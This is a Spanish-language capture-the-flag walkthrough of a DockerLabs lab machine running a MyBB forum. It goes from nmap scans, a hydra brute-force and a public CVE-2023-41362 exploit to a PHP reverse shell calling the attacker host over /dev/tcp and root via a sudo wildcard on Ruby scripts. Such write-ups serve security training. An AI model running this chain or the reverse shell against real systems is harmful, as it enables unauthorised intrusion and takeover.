#MAQUINA #DOCKERLABS #MEDIO 
#MYBB
<hr>

# RECONOCIMIENTO

Vamos a resolver **MyBB** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-20 15:26 CET
Initiating ARP Ping Scan at 15:26
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 15:26, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:26
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 15:26, 0.49s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2025-02-20 15:26:55 CET for 1s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.70 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)



```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** abierto.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p80 172.17.0.2                                 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-20 15:27 CET
Nmap scan report for panel.mybb.dl (172.17.0.2)
Host is up (0.000021s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Forums
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect resu



```

```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-20 15:27 CET
Nmap scan report for panel.mybb.dl (172.17.0.2)
Host is up (0.0000030s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.php: Possible admin folder
|   /backups/: Backup folder w/ directory listing
|   /archive/: Potentially interesting folder
|   /cache/: Potentially interesting folder
|   /images/: Potentially interesting folder
|   /inc/: Potentially interesting folder
|   /install/: Potentially interesting folder
|_  /uploads/: Potentially interesting folder
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds



```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

Al hacer el virtual hosting es cuando salen mas cosas interesantes.

## HTTP (80)

Al revisar los directorios interesantes:

En backups vemos un archivo **data**, en el que leyendo vemos varios usuarios y que **alice** hizo una conexión con la contra :

```bash
$2y$10$OwtjLEqBf9BFDtK8sSzJ5u.gR.tKYfYNmcWqIzQBbkv.pTgKX.pPi
```

**Contra -> tinkerbell**

Probamos y no sirve, vemos que aparentemente no hay nada en los demás sitios.

Vemos que en el listado de usuarios hay un usuario **admin**.

# EXPLOTACION

Vamos a intentar usar **hydra** para hacer fuerza bruta al login:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt "panel.mybb.dl" http-post-form "/admin:username=^USER^&password=^PASS^:H=Cookie: sid=351615a34520a719dce7e9a31628ca89:F=The username and password combination you entered is invalid."   
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-21 08:51:49
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://panel.mybb.dl:80/admin:username=^USER^&password=^PASS^:H=Cookie: sid=351615a34520a719dce7e9a31628ca89:F=The username and password combination you entered is invalid.
[80][http-post-form] host: panel.mybb.dl   login: admin   password: password
[80][http-post-form] host: panel.mybb.dl   login: admin   password: princess
[80][http-post-form] host: panel.mybb.dl   login: admin   password: 12345
[80][http-post-form] host: panel.mybb.dl   login: admin   password: 123456789
[80][http-post-form] host: panel.mybb.dl   login: admin   password: 1234567
[80][http-post-form] host: panel.mybb.dl   login: admin   password: 12345678
[80][http-post-form] host: panel.mybb.dl   login: admin   password: 123456
[80][http-post-form] host: panel.mybb.dl   login: admin   password: rockyou
[80][http-post-form] host: panel.mybb.dl   login: admin   password: abc123
[80][http-post-form] host: panel.mybb.dl   login: admin   password: nicole
[80][http-post-form] host: panel.mybb.dl   login: admin   password: lovely
[80][http-post-form] host: panel.mybb.dl   login: admin   password: iloveyou
[80][http-post-form] host: panel.mybb.dl   login: admin   password: jessica
[80][http-post-form] host: panel.mybb.dl   login: admin   password: daniel
[80][http-post-form] host: panel.mybb.dl   login: admin   password: babygirl
[80][http-post-form] host: panel.mybb.dl   login: admin   password: monkey
1 of 1 target successfully completed, 16 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-21 08:51:50

```

Probamos una a una y sacamos la password de **admin -> babygirl**.

Al entrar y ver la versión, vemos que es vulnerable -> https://vuldb.com/es/?id.238273.
Buscamos la vuln y vemos que hay un script, nos lo descargamos -> https://github.com/SorceryIE/CVE-2023-41362_MyBB_ACP_RCE/blob/main/exploit.py

Ejecutamos :

```bash

./exploit.py http://panel.mybb.dl/ admin babygirl

```

YA ESTAMOS DENTRO.

Vamos a mandar un script php. Y al entrar a verlo nos otorgara una reverse shell para luego hacer una full tty:

```

wget "http://172.17.0.1:8000/wp.php"

```

```php

<?php

/**
* Plugin Name: test-plugin
* Plugin URI: https://www.your-site.com/
* Description: Test.
* Version: 0.1
* Author: your-name
* Author URI: https://www.your-site.com/
**/


        exec("/bin/bash -c 'bash -i > /dev/tcp/172.17.0.1/443 0>&1'");

?>

```

YA ESTAMOS COMO WWW-DATA.
# ESCALADA PRIVILEGIOS

Vemos los usuarios y tenemos a alice, probamos la contra.

YA ESTAMOS COMO ALICE.

Vemos si el usuario tiene permisos SUDO:
   ```bash
alice@4d0e3d13548a:/var/www/mybb$ sudo -l
Matching Defaults entries for alice on 4d0e3d13548a:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User alice may run the following commands on 4d0e3d13548a:
    (ALL : ALL) NOPASSWD: /home/alice/scripts/*.rb

```

Vemos **archivos .rb** dentro del directorio de alice con permisos SUDO, creamos uno a nuestro gusto:

   ```bash
root@4d0e3d13548a:/home/alice/scripts# ls -la
total 16
drwxrwxr-- 1 root  alice 4096 Feb 21 09:49 .
drwxr-x--- 1 root  alice 4096 Jun 16  2024 ..
-rwxrwxr-x 1 alice alice   37 Feb 21 09:51 script.rb
root@4d0e3d13548a:/home/alice/scripts# cat script.rb 
#!/usr/bin/env ruby
exec "/bin/bash"
root@4d0e3d13548a:/home/alice/scripts# whoami
root
root@4d0e3d13548a:/home/alice/scripts# 

```

**YA ESTAMOS COMO ROOT.